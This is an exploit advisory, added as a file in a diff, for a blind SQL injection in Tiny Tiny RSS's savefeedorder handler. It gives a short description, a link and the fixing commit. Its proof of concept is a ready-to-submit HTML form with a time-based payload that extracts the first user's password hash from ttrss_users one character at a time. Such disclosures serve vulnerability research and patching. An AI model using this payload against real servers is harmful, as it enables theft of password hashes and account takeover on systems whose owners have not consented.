@@ -1,0 +1,30 @@
+# Exploit Title: Tiny Tiny RSS Blind SQL Injection
+# Date: 15-02-2016
+# Software Link: http://tt-rss.org/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+   
+$item_id inside process_category_order() is not properly escaped.
+
+We control this value using $_POST['payload'].
+
+http://security.szurek.pl/tiny-tiny-rss-blind-sql-injection.html
+
+2. Proof of Concept
+
+Login as regular user.
+
+<form method="post" action="http://tiny-tiny-rss/backend.php">
+    <input type="hidden" name="op" value="pref-feeds">
+    <input type="hidden" name="method" value="savefeedorder">
+    <textarea name="payload">{"items":[{"items":{"_reference":"CAT:1' AND order_id = (SELECT IF(substr(pwd_hash,1,1) = CHAR(77), SLEEP(5), 0) FROM ttrss_users WHERE id = 1) AND -- "},"id":"root"}]}&lt;/textarea&gt;
+    <input type="submit" value="Hack!">
+</form>
+
+3. Solution:
+   
+Update to version a5556c2471973e292dce615fe0c77fdbbc54405b
